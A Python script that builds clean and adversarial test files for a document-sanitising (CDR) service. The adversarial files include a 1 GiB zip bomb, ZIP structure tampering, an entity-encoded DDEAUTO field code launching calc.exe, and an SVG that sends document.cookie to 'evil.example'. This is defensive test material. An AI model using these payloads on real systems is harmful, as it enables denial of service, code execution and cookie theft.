#!/usr/bin/env python3
"""
Generate a graduated CDR test corpus for exercising a LIVE deployment.

Two sets, written to docs/test-corpus/:
  clean/        — one benign file per format. These should round-trip through CDR and land
                  in the SANITISED bucket, still functionally valid (CDR must not corrupt
                  innocent files). Few or zero removals expected.
  adversarial/  — tough hostile files that go BEYOND the in-repo unit-test fixtures:
                  zip bombs, polyglots, falsified central-directory sizes, nested threats,
                  malformed/anomalous ZIPs, encoding-bypass attempts, oversized, and
                  unknown extensions (fail-closed). Each should be sanitised, rejected,
                  quarantined, or — for the bomb/oversize cases — refused without OOM.

Run:  source bin/activate && python docs/fixtures/generate_test_corpus.py
"""

import io
import os
import struct
import zipfile

import openpyxl
import pikepdf
from PIL import Image

ROOT = os.path.join(os.path.dirname(__file__), "..", "test-corpus")
CLEAN = os.path.join(ROOT, "clean")
ADV = os.path.join(ROOT, "adversarial")

_manifest: list[tuple[str, str, str]] = []  # (relpath, bytes_label, expectation)


def _write(subdir: str, name: str, data: bytes, expectation: str) -> None:
    os.makedirs(subdir, exist_ok=True)
    path = os.path.join(subdir, name)
    with open(path, "wb") as fh:
        fh.write(data)
    rel = os.path.relpath(path, ROOT)
    _manifest.append((rel, f"{len(data):,}B", expectation))
    print(f"  wrote {rel}  ({len(data):,} bytes)")


# ══════════════════════════════════════════════════════════════════════════════
# OOXML helpers — build minimal but VALID Office packages
# ══════════════════════════════════════════════════════════════════════════════

REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
CT_NS = "http://schemas.openxmlformats.org/package/2006/content-types"


def _ooxml(parts: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in parts.items():
            z.writestr(name, data)
    return buf.getvalue()


def _ct(*overrides: tuple[str, str]) -> bytes:
    ov = "".join(f'<Override PartName="{p}" ContentType="{c}"/>' for p, c in overrides)
    return (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Types xmlns="{CT_NS}">'
        f'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        f'<Default Extension="xml" ContentType="application/xml"/>'
        f'<Default Extension="png" ContentType="image/png"/>'
        f"{ov}</Types>"
    ).encode()


def _root_rels(rel_id: str, rtype: str, target: str) -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Relationships xmlns="{REL_NS}">'
        f'<Relationship Id="{rel_id}" Type="{rtype}" Target="{target}"/>'
        f"</Relationships>"
    ).encode()


# ── Clean Office files ──────────────────────────────────────────────────────────

def clean_docx() -> bytes:
    doc = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        "<w:body><w:p><w:r><w:t>Quarterly report — all figures approved. AT&amp;T renewal on track.</w:t></w:r></w:p>"
        "</w:body></w:document>"
    ).encode()
    return _ooxml({
        "[Content_Types].xml": _ct(
            ("/word/document.xml",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml")),
        "_rels/.rels": _root_rels(
            "rId1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
            "word/document.xml"),
        "word/document.xml": doc,
    })


def clean_xlsx() -> bytes:
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Budget"
    ws["A1"] = "Item"; ws["B1"] = "Cost"
    ws["A2"] = "Licenses"; ws["B2"] = 4200.50
    ws["A3"] = "Total"; ws["B3"] = "=SUM(B2:B2)"   # a legitimate formula
    ws["A4"] = "Note"; ws["B4"] = "Profit|Loss summary — see appendix"  # benign pipe text
    out = io.BytesIO(); wb.save(out)
    return out.getvalue()


def clean_pptx() -> bytes:
    # Minimal valid pptx (presentation with one blank slide).
    pres = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        '<p:sldIdLst><p:sldId id="256" r:id="rId2"/></p:sldIdLst>'
        '<p:sldSz cx="9144000" cy="6858000"/></p:presentation>'
    ).encode()
    slide = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
        'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
        '<p:cSld><p:spTree/></p:cSld></p:sld>'
    ).encode()
    pres_rels = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="{REL_NS}">'
        '<Relationship Id="rId2" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" '
        'Target="slides/slide1.xml"/></Relationships>'
    ).encode()
    return _ooxml({
        "[Content_Types].xml": _ct(
            ("/ppt/presentation.xml",
             "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"),
            ("/ppt/slides/slide1.xml",
             "application/vnd.openxmlformats-officedocument.presentationml.slide+xml")),
        "_rels/.rels": _root_rels(
            "rId1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
            "ppt/presentation.xml"),
        "ppt/presentation.xml": pres,
        "ppt/_rels/presentation.xml.rels": pres_rels,
        "ppt/slides/slide1.xml": slide,
    })


def clean_docx_customxml() -> bytes:
    """Regression for the customXml dangling-relationship bug: a docx with a customXml part
    AND a document.xml.rels relationship pointing at it. CDR strips the customXml/ part — it
    MUST also drop the relationship, or the dangling rel breaks strict OPC consumers
    (python-docx/Word) with 'There is no item named customXml/item1.xml'. Expected: sanitised
    AND still re-parseable, with no customXml part or rel remaining."""
    doc = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        "<w:body><w:p><w:r><w:t>Document with a customXml data island that must be stripped "
        "cleanly, leaving a structurally valid file with no dangling relationship.</w:t></w:r></w:p>"
        "</w:body></w:document>"
    ).encode()
    doc_rels = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Relationships xmlns="{REL_NS}">'
        f'<Relationship Id="rIdCx" '
        f'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" '
        f'Target="../customXml/item1.xml"/>'
        f"</Relationships>"
    ).encode()
    return _ooxml({
        "[Content_Types].xml": _ct(
            ("/word/document.xml",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml")),
        "_rels/.rels": _root_rels(
            "rId1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
            "word/document.xml"),
        "word/document.xml": doc,
        "word/_rels/document.xml.rels": doc_rels,
        "customXml/item1.xml": b"<root><data>custom xml payload to be removed</data></root>",
    })


def clean_docx_field_keywords_in_styles() -> bytes:
    """Regression for the field-scrub false-positive: a styles part containing field-code
    KEYWORDS (link, autoRedefine, …) inside legitimate ELEMENT/ATTRIBUTE names. The keyword+
    argument scrub must NOT touch these (it is scoped to <w:instrText>/<w:fldSimple w:instr>
    field carriers) — the old raw-XML regex emitted a value-less _CDR_REMOVED_ attribute here,
    producing invalid XML. Expected: sanitised and byte-stable styles (no _CDR_REMOVED_)."""
    doc = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        "<w:body><w:p><w:pPr><w:pStyle w:val=\"Heading1\"/></w:pPr>"
        "<w:r><w:t>Body text with a heading style applied.</w:t></w:r></w:p></w:body></w:document>"
    ).encode()
    # 'w:link', 'w:autoRedefine' are real style-definition element/attr names that contain the
    # LINK / AUTO field keywords — they must survive untouched.
    styles = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:style w:type="paragraph" w:styleId="Heading1">'
        '<w:name w:val="heading 1"/><w:link w:val="Heading1Char"/><w:autoRedefine/>'
        '<w:rPr><w:rFonts w:hAnsi="Calibri Light"/></w:rPr></w:style>'
        '<w:style w:type="character" w:styleId="Heading1Char"><w:name w:val="Heading 1 Char"/></w:style>'
        "</w:styles>"
    ).encode()
    doc_rels = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Relationships xmlns="{REL_NS}">'
        f'<Relationship Id="rIdS" '
        f'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" '
        f'Target="styles.xml"/></Relationships>'
    ).encode()
    return _ooxml({
        "[Content_Types].xml": _ct(
            ("/word/document.xml",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"),
            ("/word/styles.xml",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml")),
        "_rels/.rels": _root_rels(
            "rId1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
            "word/document.xml"),
        "word/document.xml": doc,
        "word/_rels/document.xml.rels": doc_rels,
        "word/styles.xml": styles,
    })


def clean_pdf() -> bytes:
    pdf = pikepdf.Pdf.new()
    pdf.add_blank_page(page_size=(612, 792))
    pdf.docinfo["/Title"] = "Clean invoice"
    out = io.BytesIO(); pdf.save(out)
    return out.getvalue()


# ── Clean images ────────────────────────────────────────────────────────────────

def _clean_image(fmt: str, mode: str = "RGB") -> bytes:
    img = Image.new(mode, (64, 48), (40, 120, 200) if mode == "RGB" else 128)
    out = io.BytesIO()
    img.save(out, format=fmt)
    return out.getvalue()


# ══════════════════════════════════════════════════════════════════════════════
# Adversarial files — beyond the in-repo unit-test fixtures
# ══════════════════════════════════════════════════════════════════════════════

def adv_zip_bomb_docx() -> bytes:
    """A 'clean'-looking docx whose document.xml deflates from ~tens of KB to ~1 GB.
    Tests _read_zip_entry_safe (chunked counter) — must be refused without OOM, NOT
    sanitised. A highly-compressible 1 GB payload of spaces inside a valid wrapper."""
    one_gb = b" " * (1024 * 1024 * 1024)  # 1 GiB of spaces → tiny deflated
    body = b'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>' + one_gb + b'</w:t></w:r></w:p></w:body></w:document>'
    return _ooxml({
        "[Content_Types].xml": _ct(
            ("/word/document.xml",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml")),
        "_rels/.rels": _root_rels(
            "rId1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
            "word/document.xml"),
        "word/document.xml": body,
    })


def adv_falsified_filesize_docx() -> bytes:
    """A valid zip-bomb docx, then patch the central-directory uncompressed-size field of
    the big entry down to 1 byte. Tests that CDR does NOT trust item.file_size — the
    chunked counter must still catch the real expansion. (Python may raise BadZipFile on
    the CRC; either a clean reject or a refused-bomb is an acceptable outcome — never a
    sanitised pass.)"""
    data = bytearray(adv_zip_bomb_docx())
    # Find the central directory entry for word/document.xml and zero its uncompressed size.
    # CD header signature 0x02014b50; uncompressed size is at offset +24 (4 bytes LE).
    needle = b"word/document.xml"
    idx = data.rfind(b"PK\x01\x02")  # last central-dir record region
    # naive: locate the CD entry whose filename is document.xml
    pos = data.find(b"PK\x01\x02")
    while pos != -1:
        name_len = struct.unpack_from("<H", data, pos + 28)[0]
        name = bytes(data[pos + 46: pos + 46 + name_len])
        if name == needle:
            struct.pack_into("<I", data, pos + 24, 1)  # uncompressed size := 1
            break
        pos = data.find(b"PK\x01\x02", pos + 1)
    return bytes(data)


def adv_nonstandard_compression_docx() -> bytes:
    """A docx where an entry uses a non-standard compression method id (not stored/deflate).
    Tests the ZIP structural hard-reject for unknown compression methods."""
    base = clean_docx()
    data = bytearray(base)
    # Flip the compression method of the first local file header (offset +8, 2 bytes) to 99.
    lfh = data.find(b"PK\x03\x04")
    struct.pack_into("<H", data, lfh + 8, 99)  # bogus method
    return bytes(data)


def adv_duplicate_entry_docx() -> bytes:
    """Two entries with the same name word/document.xml — a 'last entry wins' confusion
    attack (a parser may read the benign one, the host app the malicious one). Tests the
    duplicate-entry hard-reject."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _ct(
            ("/word/document.xml",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml")))
        z.writestr("_rels/.rels", _root_rels(
            "rId1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
            "word/document.xml"))
        z.writestr("word/document.xml", b"<w:document>benign</w:document>")
        z.writestr("word/document.xml", b"<w:document>EVIL DDEAUTO c:\\\\evil.exe</w:document>")
    return buf.getvalue()


def adv_pdf_zip_polyglot() -> bytes:
    """A file that is BOTH a valid PDF (header at offset 0) and contains an embedded ZIP
    payload appended after %%EOF. Named .pdf. Tests that pikepdf re-serialisation drops the
    appended bytes (the polyglot ZIP must not survive)."""
    pdf = pikepdf.Pdf.new()
    pdf.add_blank_page(page_size=(200, 200))
    out = io.BytesIO(); pdf.save(out)
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as z:
        z.writestr("payload.txt", b"this ZIP is appended after the PDF EOF")
    return out.getvalue() + b"\n" + zbuf.getvalue()


def adv_entity_encoded_dde_docx() -> bytes:
    """DDE field code hidden behind XML numeric character references + nested in a way the
    naive regex would miss. Tests _strip_xml_macros entity-decoding (in-place neutralise)."""
    # &#68;&#68;&#69;&#65;&#85;&#84;&#79; = "DDEAUTO"
    enc = "&#68;&#68;&#69;&#65;&#85;&#84;&#79;"
    doc = (
        '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f'<w:body><w:p><w:r><w:instrText> {enc} c:\\\\windows\\\\system32\\\\calc.exe </w:instrText></w:r></w:p>'
        '<w:p><w:r><w:t>Legitimate text with AT&amp;T should survive.</w:t></w:r></w:p>'
        '</w:body></w:document>'
    ).encode()
    return _ooxml({
        "[Content_Types].xml": _ct(
            ("/word/document.xml",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml")),
        "_rels/.rels": _root_rels(
            "rId1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
            "word/document.xml"),
        "word/document.xml": doc,
    })


def adv_nested_macro_in_embeddings() -> bytes:
    """A clean-looking xlsx that carries a macro-enabled .docm INSIDE xl/embeddings/. Tests
    that the embeddings/ part is dropped wholesale (the nested VBA must never be reachable)."""
    inner = clean_docx()  # stand-in nested OOXML payload
    return _ooxml({
        "[Content_Types].xml": _ct(
            ("/xl/workbook.xml",
             "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml")),
        "_rels/.rels": _root_rels(
            "rId1",
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
            "xl/workbook.xml"),
        "xl/workbook.xml": b"<workbook><sheets/></workbook>",
        "xl/embeddings/nested_macro.docm": inner,
        "xl/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0" + b"MZ\x90\x00 fake exe " * 64,
    })


def adv_svg_xss() -> bytes:
    """SVG carrying an onload + <script> — an unhandled extension. Tests FAIL-CLOSED:
    must be quarantined as unsupported-format, NEVER passed through to sanitised."""
    return (
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">'
        '<script>fetch("https://evil.example/"+document.cookie)</script>'
        '<rect width="10" height="10"/></svg>'
    ).encode()


def adv_eicar_zip() -> bytes:
    """A .zip (unknown extension) containing the EICAR antivirus test string. Tests
    fail-closed routing for an unhandled archive type (CDR doesn't recurse arbitrary zips)."""
    eicar = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("eicar.com", eicar)
    return buf.getvalue()


def adv_oversized_png() -> bytes:
    """A ~120 MB PNG (over the 100 MB CDR_MAX_FILE_BYTES default). Tests the pre-download
    size guard → quarantined via copy, source preserved-then-handled, no OOM. Large, so
    only generated when CORPUS_BIG=1 to avoid bloating the repo."""
    # 120 MB of random-ish pixels (incompressible so the file is genuinely large).
    side = 6300  # 6300x6300 RGB ≈ 119 MB raw; PNG of noise stays large
    img = Image.frombytes("RGB", (side, side), os.urandom(side * side * 3))
    out = io.BytesIO(); img.save(out, format="PNG", compress_level=0)
    return out.getvalue()


# ══════════════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    print("== CLEAN baseline (expect: sanitised, functionally intact) ==")
    _write(CLEAN, "clean.docx", clean_docx(), "sanitised, text intact")
    _write(CLEAN, "clean.xlsx", clean_xlsx(), "sanitised, cells intact")
    _write(CLEAN, "clean.pptx", clean_pptx(), "sanitised, opens")
    _write(CLEAN, "clean.pdf", clean_pdf(), "sanitised, opens")
    _write(CLEAN, "clean.jpg", _clean_image("JPEG"), "sanitised, re-encoded")
    _write(CLEAN, "clean.png", _clean_image("PNG"), "sanitised, re-encoded")
    _write(CLEAN, "clean.gif", _clean_image("GIF", "P"), "sanitised, re-encoded")
    _write(CLEAN, "clean.bmp", _clean_image("BMP"), "sanitised, re-encoded")
    _write(CLEAN, "clean.tiff", _clean_image("TIFF"), "sanitised, re-encoded")
    _write(CLEAN, "clean.webp", _clean_image("WEBP"), "sanitised, re-encoded")
    _write(CLEAN, "regression_customxml_rel.docx", clean_docx_customxml(),
           "sanitised + re-parseable — customXml part AND its dangling relationship dropped "
           "(regression for the customXml dangling-rel bug)")
    _write(CLEAN, "regression_styles_field_keywords.docx", clean_docx_field_keywords_in_styles(),
           "sanitised, styles.xml byte-stable (no _CDR_REMOVED_) — field-code keywords inside "
           "element/attr names must NOT be corrupted (regression for the field-scrub false positive)")

    print("\n== ADVERSARIAL (expect: sanitised / rejected / quarantined — never a clean pass) ==")
    _write(ADV, "zipbomb.docx", adv_zip_bomb_docx(),
           "REFUSED by chunked counter (no OOM); not sanitised")
    _write(ADV, "falsified_filesize.docx", adv_falsified_filesize_docx(),
           "rejected or refused — file_size not trusted")
    _write(ADV, "nonstandard_compression.docx", adv_nonstandard_compression_docx(),
           "ZIP hard-reject (bad compression method) → quarantine")
    _write(ADV, "duplicate_entry.docx", adv_duplicate_entry_docx(),
           "ZIP hard-reject (duplicate entry) → quarantine")
    _write(ADV, "pdf_zip_polyglot.pdf", adv_pdf_zip_polyglot(),
           "sanitised — appended ZIP dropped by pikepdf re-serialise")
    _write(ADV, "entity_encoded_dde.docx", adv_entity_encoded_dde_docx(),
           "sanitised — DDEAUTO neutralised, AT&T survives")
    _write(ADV, "nested_macro_embeddings.xlsx", adv_nested_macro_in_embeddings(),
           "sanitised — embeddings/ (nested docm + OLE) dropped")
    _write(ADV, "xss.svg", adv_svg_xss(),
           "FAIL-CLOSED — quarantined unsupported-format, NOT sanitised")
    _write(ADV, "eicar.zip", adv_eicar_zip(),
           "FAIL-CLOSED — quarantined unsupported-format")

    if os.environ.get("CORPUS_BIG") == "1":
        _write(ADV, "oversized.png", adv_oversized_png(),
               "quarantined — over CDR_MAX_FILE_BYTES, no OOM")
    else:
        print("  (skipped oversized.png — set CORPUS_BIG=1 to generate the ~120 MB file)")

    # Manifest for the live test run.
    man = os.path.join(ROOT, "MANIFEST.md")
    with open(man, "w") as fh:
        fh.write("# CDR test corpus — expected outcomes\n\n")
        fh.write("| File | Size | Expected outcome |\n|---|---|---|\n")
        for rel, size, exp in _manifest:
            fh.write(f"| `{rel}` | {size} | {exp} |\n")
    print(f"\nManifest → {os.path.relpath(man, os.path.join(os.path.dirname(__file__), '..', '..'))}")
    print(f"Total: {len(_manifest)} files.")


if __name__ == "__main__":
    main()
